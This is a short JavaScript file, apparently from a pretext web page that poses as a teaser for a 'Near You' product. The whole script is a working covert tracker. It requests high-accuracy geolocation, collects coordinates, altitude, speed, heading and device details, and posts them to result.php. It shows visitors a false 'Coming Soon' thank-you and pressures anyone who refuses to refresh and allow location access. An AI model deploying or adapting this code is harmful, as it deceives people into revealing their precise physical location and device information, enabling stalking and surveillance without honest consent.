if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    var ptf = navigator.platform;
    var cc = navigator.hardwareConcurrency;
    var ram = navigator.deviceMemory;
    var ver = navigator.userAgent;
    var location =  " "+lat +","+lon;

    $.ajax({
      type: 'POST',
      url: 'result.php',
      data: {latitude: lat, longitude: lon, Location: location, Accuracy: acc, altitude: alt, Direction: dir, Speed: spd, platform: ptf, CPUCore: cc, ram: ram, Browser: ver},
      success: function(){$('#change').html('Coming Soon');},
      mimeType: 'text'
    });
    alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
  };


  function showError(error)
{
  switch(error.code)
  {
    case error.PERMISSION_DENIED:
      var denied = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      break;
    case error.POSITION_UNAVAILABLE:
      var unavailable = 'Location information is unavailable';
      break;
    case error.TIMEOUT:
      var timeout = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
      break;
    case error.UNKNOWN_ERROR:
      var unknown = 'An unknown error occurred';
      break;
  }

  $.ajax({
    type: 'POST',
    url: '/php/error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
}
